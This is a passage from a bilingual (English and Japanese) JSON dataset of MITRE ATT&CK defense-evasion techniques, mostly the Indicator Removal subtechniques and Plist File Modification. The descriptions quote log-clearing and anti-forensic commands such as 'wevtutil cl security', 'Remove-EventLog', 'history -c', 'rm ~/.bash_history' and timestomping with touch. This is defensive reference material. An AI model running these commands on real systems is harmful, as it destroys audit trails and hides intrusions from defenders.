TCC)\n\n攻撃者は、以前に[プロセスインジェクション](https://attack.mitre.org/techniques/T1055)を介して権限が付与されたアプリケーションを悪用したり、別のアプリケーションを使用して悪意のあるバイナリを実行したりすることで、TCCによって保護されている制限されたデータまたはサービスにアクセスする可能性があります。例えば、攻撃者はFDA権限を持つmacOSネイティブアプリであるFinderを使用して、悪意のある[AppleScript](https://attack.mitre.org/techniques/T1059/002)を実行できます。Finderアプリで実行すると、悪意のある[AppleScript](https://attack.mitre.org/techniques/T1059/002)はユーザープロンプトを必要とせずにシステム上のすべてのファイルへのアクセスを継承します。システム整合性保護（SIP）が無効になっている場合、TCC保護も無効になります。SIPが無効になっているシステムの場合、攻撃者は環境変数と[Launchctl](https://attack.mitre.org/techniques/T1569/001)を使用して攻撃者が制御するTCCデータベースをロードすることにより、TCCデータベースを操作して悪意のある実行可能ファイルに権限を追加できます。(引用: TCC macOS bypass)(引用: TCC Database)"
                    }
                ]
            },
            {
                "id": "T1070",
                "name_eng": "Indicator Removal",
                "name_jp": "インジケーター削除",
                "description_eng": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "description_jp": "攻撃者は、システム内に生成されたアーティファクトを削除または変更して、自身の存在の証拠を削除したり、防御を妨害したりする可能性があります。さまざまなアーティファクトが、攻撃者または攻撃者の行動に起因する何かによって作成される場合があります。通常、これらのアーティファクトは、ダウンロードされたファイルからの文字列、ユーザーアクションから生成されるログ、防御側が分析するその他のデータなど、監視対象イベントに関連する防御インジケーターとして使用されます。アーティファクトの場所、形式、およびタイプ（コマンドやログイン履歴など）は、多くの場合、各プラットフォームに固有です。\n\nこれらのインジケーターを削除すると、イベント収集、報告、または侵入アクティビティの検出に使用されるその他のプロセスが妨害される可能性があります。これにより、注目すべきイベントが報告されなくなることで、セキュリティソリューションの整合性が損なわれる可能性があります。このアクティビティはまた、発生した事柄を判断するための十分なデータがないため、フォレンジック分析やインシデント対応を妨げる可能性もあります。",
                "subtechniques": [
                    {
                        "id": "T1070.004",
                        "name_eng": "File Deletion",
                        "name_jp": "ファイル削除",
                        "description_eng": "Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well.(Citation: Microsoft SDelete July 2016) Examples of built-in [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) functions include <code>del</code> on Windows, <code>rm</code> or <code>unlink</code> on Linux and macOS, and `rm` on ESXi.",
                        "description_jp": "攻撃者は、侵入活動の行為によって残されたファイルを削除する可能性があります。マルウェア、ツール、または攻撃者によってシステムにドロップまたは作成されたその他の非ネイティブファイル（例：[イングレスツール転送](https://attack.mitre.org/techniques/T1105)）は、ネットワーク内で何が行われたか、どのように行われたかを示す痕跡を残す可能性があります。これらのファイルの削除は、侵入中、または侵入後のプロセスの一部として、攻撃者のフットプリントを最小限に抑えるために行われる可能性があります。\n\nクリーンアップを実行するためのツールはホストオペレーティングシステムから利用できますが、攻撃者は他のツールも使用する可能性があります。(引用: Microsoft SDelete July 2016) 組み込みの[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)機能の例としては、Windowsの<code>del</code>、LinuxおよびmacOSの<code>rm</code>または<code>unlink</code>、ESXiの<code>rm</code>などがあります。"
                    },
                    {
                        "id": "T1070.006",
                        "name_eng": "Timestomp",
                        "name_jp": "タイムスタンプ操作",
                        "description_eng": "Adversaries may modify file time attributes to hide new files or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder and blend malicious files with legitimate files.\n\nIn Windows systems, both the `$STANDARD_INFORMATION` (`$SI`) and `$FILE_NAME` (`$FN`) attributes record times in a Master File Table (MFT) file.(Citation: Inversecos Timestomping 2022) `$SI` (dates/time stamps) is displayed to the end user, including in the File System view, while `$FN` is dealt with by the kernel.(Citation: Magnet Forensics)\n\nModifying the `$SI` attribute is the most common method of timestomping because it can be modified at the user level using API calls. `$FN` timestomping, however, typically requires interacting with the system kernel or moving or renaming a file.(Citation: Inversecos Timestomping 2022)\n\nAdversaries modify timestamps on files so that they do not appear conspicuous to forensic investigators or file analysis tools. In order to evade detections that rely on identifying discrepancies between the `$SI` and `$FN` attributes, adversaries may also engage in “double timestomping” by modifying times on both attributes simultaneously.(Citation: Double Timestomping)\n\nIn Linux systems and on ESXi servers, threat actors may attempt to perform timestomping using commands such as `touch -a -m -t <timestamp> <filename>` (which sets access and modification times to a specific value) or `touch -r <filename> <filename>` (which sets access and modification times to match those of another file).(Citation: Inversecos Linux Timestomping)(Citation: Juniper Networks ESXi Backdoor 2022)\n\nTimestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools.(Citation: WindowsIR Anti-Forensic Techniques)",
                        "description_jp": "攻撃者は、新しいファイルや既存のファイルへの変更を隠すために、ファイル時間属性を変更する可能性があります。タイムスタンプ操作は、ファイルのタイムスタンプ（変更、アクセス、作成、変更時間）を変更するテクニックであり、多くの場合、同じフォルダにあるファイルを模倣し、悪意のあるファイルを正当なファイルと混ぜ合わせるために行われます。\n\nWindowsシステムでは、<code>$STANDARD_INFORMATION</code>（<code>$SI</code>）と<code>$FILE_NAME</code>（<code>$FN</code>）の両方の属性がマスターファイルテーブル（MFT）ファイルに時間を記録します。(引用: Inversecos Timestomping 2022) <code>$SI</code>（日付/タイムスタンプ）はファイルシステムビューを含めエンドユーザーに表示されますが、<code>$FN</code>はカーネルによって処理されます。(引用: Magnet Forensics)\n\n<code>$SI</code>属性の変更は、API呼び出しを使用してユーザーレベルで変更できるため、最も一般的なタイムスタンプ操作の方法です。ただし、<code>$FN</code>タイムスタンプ操作は通常、システムカーネルと対話するか、ファイルを移動または名前変更する必要があります。(引用: Inversecos Timestomping 2022)\n\n攻撃者は、フォレンジック調査員やファイル分析ツールに目立たないようにするために、ファイルのタイムスタンプを変更します。<code>$SI</code>属性と<code>$FN</code>属性の間の不一致を特定することに依存する検出を回避するために、攻撃者は両方の属性の時間を同時に変更することにより、「ダブルタイムスタンプ操作」を行う場合もあります。(引用: Double Timestomping)\n\nLinuxシステムおよびESXiサーバーでは、脅威アクターは<code>touch -a -m -t <timestamp> <filename></code>（アクセス時刻と変更時刻を特定の値に設定する）や<code>touch -r <filename> <filename></code>（アクセス時刻と変更時刻を別のファイルのものと一致させる）などのコマンドを使用してタイムスタンプ操作を実行しようとする可能性があります。(引用: Inversecos Linux Timestomping)(引用: Juniper Networks ESXi Backdoor 2022)\n\nタイムスタンプ操作は、マルウェアやツールを隠すためにファイル名の[マスカレード](https://attack.mitre.org/techniques/T1036)と共に使用される場合があります。(引用: WindowsIR Anti-Forensic Techniques)"
                    },
                    {
                        "id": "T1070.008",
                        "name_eng": "Clear Mailbox Data",
                        "name_jp": "メールボックスデータの消去",
                        "description_eng": "Adversaries may modify mail and mail application data to remove evidence of their activity. Email applications allow users and other programs to export and delete mailbox data via command line tools or use of APIs. Mail application data can be emails, email metadata, or logs generated by the application or operating system, such as export requests. \n\nAdversaries may manipulate emails and mailbox data to remove logs, artifacts, and metadata, such as evidence of [Phishing](https://attack.mitre.org/techniques/T1566)/[Internal Spearphishing](https://attack.mitre.org/techniques/T1534), [Email Collection](https://attack.mitre.org/techniques/T1114), [Mail Protocols](https://attack.mitre.org/techniques/T1071/003) for command and control, or email-based exfiltration such as [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048). For example, to remove evidence on Exchange servers adversaries have used the <code>ExchangePowerShell</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) module, including <code>Remove-MailboxExportRequest</code> to remove evidence of mailbox exports.(Citation: Volexity SolarWinds)(Citation: ExchangePowerShell Module) On Linux and macOS, adversaries may also delete emails through a command line utility called <code>mail</code>  or use [AppleScript](https://attack.mitre.org/techniques/T1059/002) to interact with APIs on macOS.(Citation: Cybereason Cobalt Kitty 2017)(Citation: mailx man page)\n\nAdversaries may also remove emails and metadata/headers indicative of spam or suspicious activity (for example, through the use of organization-wide transport rules) to reduce the likelihood of malicious emails being detected by security products.(Citation: Microsoft OAuth Spam 2022)",
                        "description_jp": "攻撃者は、活動の証拠を削除するために、メールおよびメールアプリケーションデータを変更する可能性があります。メールアプリケーションでは、ユーザーや他のプログラムがコマンドラインツールやAPIを使用してメールボックスデータをエクスポートおよび削除できます。メールアプリケーションデータには、メール、メールメタデータ、またはエクスポート要求など、アプリケーションやオペレーティングシステムによって生成されるログが含まれます。\n\n攻撃者は、[フィッシング](https://attack.mitre.org/techniques/T1566)/[内部スピアフィッシング](https://attack.mitre.org/techniques/T1534)、[メール収集](https://attack.mitre.org/techniques/T1114)、コマンドアンドコントロールのための[メールプロトコル](https://attack.mitre.org/techniques/T1071/003)、または[代替プロトコル経由のデータ持ち出し](https://attack.mitre.org/techniques/T1048)などのメールベースのデータ持ち出しの証拠など、ログ、アーティファクト、メタデータを削除するためにメールやメールボックスデータを操作する可能性があります。例えば、Exchangeサーバー上の証拠を削除するために、攻撃者は<code>ExchangePowerShell</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001)モジュールを使用しており、これにはメールボックスエクスポートの証拠を削除するための<code>Remove-MailboxExportRequest</code>が含まれます。(引用: Volexity SolarWinds)(引用: ExchangePowerShell Module) LinuxおよびmacOSでは、攻撃者は<code>mail</code>というコマンドラインユーティリティを介してメールを削除したり、macOS上のAPIと対話するために[AppleScript](https://attack.mitre.org/techniques/T1059/002)を使用したりすることもあります。(引用: Cybereason Cobalt Kitty 2017)(引用: mailx man page)\n\n攻撃者はまた、悪意のあるメールがセキュリティ製品によって検出される可能性を低減するために、スパムや疑わしいアクティビティを示すメールやメタデータ/ヘッダーを削除する場合があります（例えば、組織全体のトランスポートルールの使用を通じて）。(引用: Microsoft OAuth Spam 2022)"
                    },
                    {
                        "id": "T1070.002",
                        "name_eng": "Clear Linux or Mac System Logs",
                        "name_jp": "LinuxまたはMacシステムログの消去",
                        "description_eng": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs",
                        "description_jp": "攻撃者は、侵入の証拠を隠すためにシステムログを消去する可能性があります。macOSとLinuxはどちらも、システムログを介してシステムまたはユーザーが開始したアクションを追跡します。ネイティブシステムログの大部分は<code>/var/log/</code>ディレクトリに保存されます。このディレクトリ内のサブフォルダは、関連する機能によってログを分類します。例：(引用: Linux Logs)\n\n* <code>/var/log/messages:</code>: 一般的およびシステム関連のメッセージ\n* <code>/var/log/secure</code>または<code>/var/log/auth.log</code>: 認証ログ\n* <code>/var/log/utmp</code>または<code>/var/log/wtmp</code>: ログイン記録\n* <code>/var/log/kern.log</code>: カーネルログ\n* <code>/var/log/cron.log</code>: Crondログ\n* <code>/var/log/maillog</code>: メールサーバーログ\n* <code>/var/log/httpd/</code>: Webサーバーアクセスおよびエラーログ"
                    },
                    {
                        "id": "T1070.001",
                        "name_eng": "Clear Windows Event Logs",
                        "name_jp": "Windowsイベントログの消去",
                        "description_eng": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                        "description_jp": "攻撃者は、侵入の活動を隠すためにWindowsイベントログをクリアする可能性があります。Windowsイベントログは、コンピュータのアラートと通知の記録です。イベントのシステム定義ソースは3つあります。システム、アプリケーション、セキュリティで、イベントタイプはエラー、警告、情報、成功監査、失敗監査の5つです。\n\n\n管理者権限があれば、次のユーティリティコマンドでイベントログをクリアできます：\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nこれらのログは、イベントビューアGUIや[PowerShell](https://attack.mitre.org/techniques/T1059/001)などの他のメカニズムを介してクリアすることもできます。例えば、攻撃者はPowerShellコマンド<code>Remove-EventLog -LogName Security</code>を使用してセキュリティイベントログを削除し、再起動後に将来のログ記録を無効にする可能性があります。注：コマンドの実行と再起動の間にイベントが生成され、.evtxファイルにログ記録される可能性があります。(引用: disable_win_evt_logging)\n\n攻撃者はまた、<code>C:\\Windows\\System32\\winevt\\logs\\</code>内に保存されているログファイルを直接削除することにより、ログをクリアしようとする可能性があります。"
                    },
                    {
                        "id": "T1070.009",
                        "name_eng": "Clear Persistence",
                        "name_jp": "永続化の痕跡消去",
                        "description_eng": "Adversaries may clear artifacts associated with previously established persistence on a host system to remove evidence of their activity. This may involve various actions, such as removing services, deleting executables, [Modify Registry](https://attack.mitre.org/techniques/T1112), [Plist File Modification](https://attack.mitre.org/techniques/T1647), or other methods of cleanup to prevent defenders from collecting evidence of their persistent presence.(Citation: Cylance Dust Storm) Adversaries may also delete accounts previously created to maintain persistence (i.e. [Create Account](https://attack.mitre.org/techniques/T1136)).(Citation: Talos - Cisco Attack 2022)\n\nIn some instances, artifacts of persistence may also be removed once an adversary’s persistence is executed in order to prevent errors with the new instance of the malware.(Citation: NCC Group Team9 June 2020)",
                        "description_jp": "攻撃者は、活動の証拠を削除するために、ホストシステム上で以前に確立された永続性に関連するアーティファクトをクリアする可能性があります。これには、サービスの削除、実行可能ファイルの削除、[レジストリの変更](https://attack.mitre.org/techniques/T1112)、[Plistファイルの変更](https://attack.mitre.org/techniques/T1647)、または防御側が永続的な存在の証拠を収集するのを防ぐためのその他のクリーンアップ方法など、さまざまなアクションが含まれる場合があります。(引用: Cylance Dust Storm) 攻撃者はまた、永続性を維持するために以前に作成されたアカウントを削除する可能性もあります（つまり、[アカウントの作成](https://attack.mitre.org/techniques/T1136)）。(引用: Talos - Cisco Attack 2022)\n\n場合によっては、マルウェアの新しいインスタンスのエラーを防ぐために、攻撃者の永続性が実行されると、永続性のアーティファクトも削除されることがあります。(引用: NCC Group Team9 June 2020)"
                    },
                    {
                        "id": "T1070.003",
                        "name_eng": "Clear Command History",
                        "name_jp": "コマンド履歴の消去",
                        "description_eng": "In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\n\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions. Adversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  \n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A) On ESXi servers, command history may be manually removed from the `/var/log/shell.log` file.(Citation: Broadcom ESXi Shell Audit)\n\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\n\nThe <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)\n\nAdversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)",
                        "description_jp": "システムログのクリアに加えて、敵対者は侵入中に行った行動を隠蔽するために、侵害されたアカウントのコマンド履歴をクリアするかもしれない。様々なコマンドインタプリタは、ユーザーが端末に入力したコマンドを追跡し、ユーザーが何をしたかを遡れるようにする。\n\nLinuxおよびmacOSでは、これらのコマンド履歴にはいくつかの異なる方法でアクセスできます。ログイン中は、このコマンド履歴は環境変数<code>HISTFILE</code>が指すファイルに記録されます。ユーザーがシステムからログオフすると、この情報はユーザーのホームディレクトリにある<code>~/.bash_history</code>というファイルに書き込まれます。これの利点は、ユーザーが異なるセッションで使用した以前のコマンドに戻ることができることです。攻撃者は、履歴を手動でクリアしたり（<code>history -c</code>）、bash履歴ファイル（<code>rm ~/.bash_history</code>）を削除したりして、これらのログからコマンドを削除する可能性があります。\n\n敵対者はまた、ネットワークデバイス上の[ネットワークデバイスCLI](https://attack.mitre.org/techniques/T1059/008)を利用して、コマンド履歴データ（<code>clear logging</code>および/または<code>clear history</code>）をクリアする可能性があります。(引用: US-CERT-TA18-106A) ESXiサーバーでは、コマンド履歴は<code>/var/log/shell.log</code>ファイルから手動で削除される場合があります。(引用: Broadcom ESXi Shell Audit)\n\nWindowsホストでは、PowerShellには2つの異なるコマンド履歴プロバイダーがあります。組み込みの履歴と、<code>PSReadLine</code>モジュールによって管理されるコマンド履歴です。組み込みの履歴は、現在のセッションで使用されたコマンドのみを追跡します。このコマンド履歴は他のセッションでは使用できず、セッションが終了すると削除されます。\n\n<code>PSReadLine</code>コマンド履歴は、すべてのPowerShellセッションで使用されたコマンドを追跡し、ファイル（デフォルトでは<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code>）に書き込みます。この履歴ファイルはすべてのセッションで使用でき、セッションが終了してもファイルは削除されないため、過去のすべての履歴が含まれています。(引用: Microsoft PowerShell Command History)\n\n攻撃者はPowerShellコマンド<code>Clear-History</code>を実行して、現在のPowerShellセッションからコマンド履歴全体をフラッシュする可能性があります。ただし、これにより<code>ConsoleHost_history.txt</code>ファイルが削除/フラッシュされることはありません。攻撃者はまた、<code>ConsoleHost_history.txt</code>ファイルを削除したり、その内容を編集したりして、実行したPowerShellコマンドを隠す可能性があります。(引用: Sophos PowerShell command audit)(引用: Sophos PowerShell Command History Forensics)"
                    },
                    {
                        "id": "T1070.010",
                        "name_eng": "Relocate Malware",
                        "name_jp": "マルウェアの再配置",
                        "description_eng": "Once a payload is delivered, adversaries may reproduce copies of the same malware on the victim system to remove evidence of their presence and/or avoid defenses. Copying malware payloads to new locations may also be combined with [File Deletion](https://attack.mitre.org/techniques/T1070/004) to cleanup older artifacts.\n\nRelocating malware may be a part of many actions intended to evade defenses. For example, adversaries may copy and rename payloads to better blend into the local environment (i.e., [Match Legitimate Resource Name or Location](https://attack.mitre.org/techniques/T1036/005)).(Citation: DFIR Report Trickbot June 2023) Payloads may also be repositioned to target [File/Path Exclusions](https://attack.mitre.org/techniques/T1564/012) as well as specific locations associated with establishing [Persistence](https://attack.mitre.org/tactics/TA0003).(Citation: Latrodectus APR 2024)\n\nRelocating malicious payloads may also hinder defensive analysis, especially to separate these payloads from earlier events (such as [User Execution](https://attack.mitre.org/techniques/T1204) and [Phishing](https://attack.mitre.org/techniques/T1566)) that may have generated alerts or otherwise drawn attention from defenders.",
                        "description_jp": "ペイロードが配信されると、攻撃者は、その存在の証拠を削除したり、防御を回避したりするために、被害者システム上で同じマルウェアのコピーを複製する可能性があります。マルウェアペイロードを新しい場所にコピーすることは、古いアーティファクトをクリーンアップするための[ファイル削除](https://attack.mitre.org/techniques/T1070/004)と組み合わせることもできます。\n\nマルウェアの再配置は、防御を回避することを目的とした多くのアクションの一部である可能性があります。例えば、攻撃者は、ローカル環境によりよく溶け込むためにペイロードをコピーして名前を変更する可能性があります（つまり、[正当なリソース名または場所との一致](https://attack.mitre.org/techniques/T1036/005)）。(引用: DFIR Report Trickbot June 2023) ペイロードはまた、[ファイル/パスの除外](https://attack.mitre.org/techniques/T1564/012)や、[永続性](https://attack.mitre.org/tactics/TA0003)の確立に関連する特定の場所をターゲットにするために再配置される場合もあります。(引用: Latrodectus APR 2024)\n\n悪意のあるペイロードを再配置すると、特に、アラートを生成したり、防御側からの注意を引いたりした可能性のある以前のイベント（[ユーザー実行](https://attack.mitre.org/techniques/T1204)や[フィッシング](https://attack.mitre.org/techniques/T1566)など）からこれらのペイロードを分離するために、防御側の分析が妨げられる可能性もあります。"
                    },
                    {
                        "id": "T1070.007",
                        "name_eng": "Clear Network Connection History and Configurations",
                        "name_jp": "ネットワーク接続履歴と構成の消去",
                        "description_eng": "Adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system and/or in application logs from behaviors that require network connections, such as [Remote Services](https://attack.mitre.org/techniques/T1021) or [External Remote Services](https://attack.mitre.org/techniques/T1133). Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries.\n\nNetwork connection history may be stored in various locations. For example, RDP connection history may be stored in Windows Registry values under (Citation: Microsoft RDP Removal):\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers</code>\n\nWindows may also store information about recent RDP connections in files such as <code>C:\\Users\\\\%username%\\Documents\\Default.rdp</code> and `C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Terminal\nServer Client\\Cache\\`.(Citation: Moran RDPieces) Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in `/Library/Logs` and/or `/var/log/`).(Citation: Apple Culprit Access)(Citation: FreeDesktop Journal)(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)\n\nMalicious network connections may also require changes to third-party applications or network configuration settings, such as [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004) or tampering to enable [Proxy](https://attack.mitre.org/techniques/T1090). Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.",
                        "description_jp": "攻撃者は、作戦の痕跡を消去するために、悪意のあるネットワーク接続の証拠を消去または削除する可能性があります。構成設定や、[リモートサービス](https://attack.mitre.org/techniques/T1021)や[外部リモートサービス](https://attack.mitre.org/techniques/T1133)など、ネットワーク接続を必要とする動作からシステム上および/またはアプリケーションログに接続履歴を強調するさまざまなアーティファクトが作成される場合があります。防御側はこれらのアーティファクトを使用して、攻撃者によって作成されたネットワーク接続を監視または分析する場合があります。\n\nネットワーク接続履歴は、さまざまな場所に保存されている可能性があります。例えば、RDP接続履歴は、Windowsレジストリ値の次の場所に保存されている場合があります。(引用: Microsoft RDP Removal):\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers</code>\n\nWindowsはまた、<code>C:\\Users\\\\%username%\\Documents\\Default.rdp</code>や`C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Terminal Server Client\\Cache\\`などのファイルに最近のRDP接続に関する情報を保存する場合もあります。(引用: Moran RDPieces) 同様に、macOSおよびLinuxホストは、システムログ（`/Library/Logs`や`/var/log/`に保存されているものなど）に接続履歴を強調する情報を保存する場合があります。(引用: Apple Culprit Access)(引用: FreeDesktop Journal)(引用: Apple Unified Log Analysis Remote Login and Screen Sharing)\n\n悪意のあるネットワーク接続には、サードパーティアプリケーションやネットワーク構成設定の変更（[システムファイアウォールの無効化または変更](https://attack.mitre.org/techniques/T1562/004)など）や、[プロキシ](https://attack.mitre.org/techniques/T1090)を有効にするための改ざんが必要になる場合もあります。攻撃者は、インジケータを隠蔽したり、防御側の分析を妨害したりするために、このデータを削除または変更する可能性があります。"
                    },
                    {
                        "id": "T1070.005",
                        "name_eng": "Network Share Connection Removal",
                        "name_jp": "ネットワーク共有接続の削除",
                        "description_eng": "Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) connections can be removed when no longer needed. [Net](https://attack.mitre.org/software/S0039) is an example utility that can be used to remove network share connections with the <code>net use \\\\system\\share /delete</code> command. (Citation: Technet Net Use)",
                        "description_jp": "攻撃者は、作戦の痕跡を消去するために、不要になった共有接続を削除する可能性があります。Windows共有ドライブおよび[SMB/Windows管理共有](https://attack.mitre.org/techniques/T1021/002)接続は、不要になったときに削除できます。[Net](https://attack.mitre.org/software/S0039)は、<code>net use \\\\system\\share /delete</code>コマンドでネットワーク共有接続を削除するために使用できるユーティリティの一例です。(引用: Technet Net Use)"
                    }
                ]
            },
            {
                "id": "T1647",
                "name_eng": "Plist File Modification",
                "name_jp": "Plistファイル変更",
                "description_eng": "Adversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses. macOS applications use plist files, such as the <code>info.plist</code> file, to store properties and configuration settings that inform the operating system how to handle the application at runtime. Plist files are structured metadata in key-value pairs formatted in XML based on Apple's Core Foundation DTD. Plist files can be saved in text or binary format.(Citation: fileinfo plist file description) \n\nAdversaries can modify key-value pairs in plist files to influence system behaviors, such as hiding the execution of an application (i.e. [Hidden Window](https://attack.mitre.org/techniques/T1564/003)) or running additional commands for persistence (ex: [Launch Agent](https://attack.mitre.org/techniques/T1543/001)/[Launch Daemon](https://attack.mitre.org/techniques/T1543/004) or [Re-opened Applications](https://attack.mitre.org/techniques/T1547/007)).\n\nFor example, adversaries can add a malicious application path to the `~/Library/Preferences/com.apple.dock.plist` file, which controls apps that appear in the Dock. Adversaries can also modify the <code>LSUIElement</code> key in an application’s <code>info.plist</code> file  to run the app in the background. Adversaries can also insert key-value pairs to insert environment variables, such as <code>LSEnvironment</code>, to enable persistence via [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006).(Citation: wardle chp2 persistence)(Citation: eset_osx_flashback)",
                "description_jp": "攻撃者は、プロパティリストファイル（plistファイル）を変更して、他の悪意のあるアクティビティを有効にし、同時にシステム防御を回避およびバイパスする可能性があります。macOSアプリケーションは、<code>info.plist</code>ファイルなどのplistファイルを使用して、オペレーティングシステムが実行時にアプリケーションを処理する方法を通知するプロパティと構成設定を格納します。Plistファイルは、AppleのCore Foundation DTDに基づいてXMLでフォーマットされたキーと値のペアの構造化メタデータです。Plistファイルは、テキスト形式またはバイナリ形式で保存できます。(引用: fileinfo plist file description)\n\n攻撃者はplistファイル内のキーと値のペアを変更して、アプリケーションの実行を隠したり（つまり[隠しウィンドウ](https://attack.mitre.org/techniques/T1564/003)）、永続化のために追加のコマンドを実行したり（例：[起動エージェント](https://attack.mitre.org/techniques/T1543/001)/[起動デーモン](https://attack.mitre.org/techniques/T1543/004)または[再起動されたアプリケーション](https://attack.mitre.org/techniques/T1547/007)）するなど、システムの動作に影響を与える可能性があります。\n\n例えば、攻撃者は悪意のあるアプリケーションパスをDockに表示されるアプリを制御する<code>~/Library/Preferences/com.apple.dock.plist</code>ファイルに追加できます。攻撃者はまた、アプリケーションの<code>info.plist</code>ファイルの<code>LSUIElement</code>キーを変更して、アプリをバックグラウンドで実行することもできます。攻撃者はまた、キーと値のペアを挿入して、[ダイナミックリンカーハイジャック](https://attack.mitre.org/techniques/T1574/006)を介した永続化を可能にするために<code>LSEnvironment</code>などの環境変数を挿入することもできます。(引用: wardle chp2 persistence)(引用: eset_osx_flashback)",
                "subtechniques": []
            },
            {
                "id": "T1542",
                "name_eng": "Pre-OS Boot",
                "name_jp": "OS起動前",
                "description_eng": "Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.(Citation: Wikipedia Booting)\n\nAdversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.",
